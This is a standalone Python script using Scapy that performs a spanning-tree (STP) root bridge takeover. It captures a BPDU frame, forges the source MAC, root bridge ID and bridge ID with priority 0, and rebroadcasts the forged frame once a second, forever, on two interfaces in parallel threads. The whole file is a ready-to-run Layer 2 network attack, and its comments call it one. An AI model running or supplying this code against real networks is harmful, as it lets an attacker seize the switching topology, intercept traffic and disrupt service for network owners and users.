from scapy.all import *
import threading
import time

# Send rogue BPDU
def send_rogue_bpdu(interface):
    # Sniff a BPDU packet (with multicast destination MAC 01:80:C2:00:00:00)
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface=interface, count=1)

    # Modify BPDU fields: source MAC, root bridge ID, etc.
    bpdu_packet = pkt[0]
    bpdu_packet.src = "00:05:1b:c2:ee:1d"  # Attacker's MAC address
    bpdu_packet.rootid = 0  # Root bridge ID priority
    bpdu_packet.rootmac = "00:00:00:00:00:01"  # Root bridge MAC
    bpdu_packet.bridgeid = 0  # Bridge ID priority
    bpdu_packet.bridgemac = "00:00:00:00:00:01"  # Bridge MAC

    # Display the modified BPDU packet
    bpdu_packet.show()

    # Continuously send the rogue BPDU packet
    while True:
        sendp(bpdu_packet, iface=interface, verbose=1)
        time.sleep(1)

# Function to send BPDUs on multiple interfaces using threads
def launch_bpdu_attack_on_interfaces(interfaces):
    # Launch a separate thread for each interface
    threads = [threading.Thread(target=send_rogue_bpdu, args=(interface,)) for interface in interfaces]

    # Start all threads
    for thread in threads:
        thread.start()

    # Wait for all threads to complete (this won't happen as the attack runs infinitely)
    for thread in threads:
        thread.join()

# Main execution point
if __name__ == "__main__":
    # Define the network interfaces for the BPDU attack
    interfaces = ['eth0', 'eth1']

    # Initiate the BPDU attack on the specified interfaces
    launch_bpdu_attack_on_interfaces(interfaces)
